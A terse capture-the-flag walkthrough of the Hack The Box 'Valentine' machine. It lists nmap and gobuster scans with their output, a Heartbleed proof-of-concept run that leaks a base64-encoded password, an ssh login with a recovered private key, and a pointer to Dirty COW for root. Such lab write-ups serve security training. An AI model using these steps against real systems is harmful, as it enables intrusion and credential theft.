10.10.10.79

# Running nmap
root@kali > nmap -sV -sC -oA nmap/valentine

    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
    |   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
    |_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
    80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
    |_http-server-header: Apache/2.2.22 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
    |_http-server-header: Apache/2.2.22 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
    | Not valid before: 2018-02-06T00:45:25
    |_Not valid after:  2019-02-06T00:45:25
    |_ssl-date: 2019-06-21T13:38:10+00:00; -20s from scanner time.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Running gobuster
root@kali: gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://valentine.htb
    /index (Status: 200)
    /dev (Status: 301)
    /encode (Status: 200)
    /decode (Status: 200)
    /omg (Status: 200)
    /server-status (Status: 403)

# The server is vulnerable to Heartbleed (main picture on the index page is a big fat hint).
# It could be checked by msf or nmap script

# Let's use python POC exploit: https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py

root@kali: python heartbleed.py 10.10.10.79

# It exposed interesting piece of memory:
    $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
# Which is encoded to heartbleedbelievethehype

# In /dev folder we see a file: https://valentine.htb/dev/hype_key
# Let's convert it to ASCII and see it's a private key

# Save the private key and use it for ssh connection with the password we found heartbleedbelievethehype:
root@kali: ssh -i hype.key hype@valentine.htb

# Linenum shows that the kernel is super old and vulnerable to dirty cow. So we can just download, compile and execute known exploit.
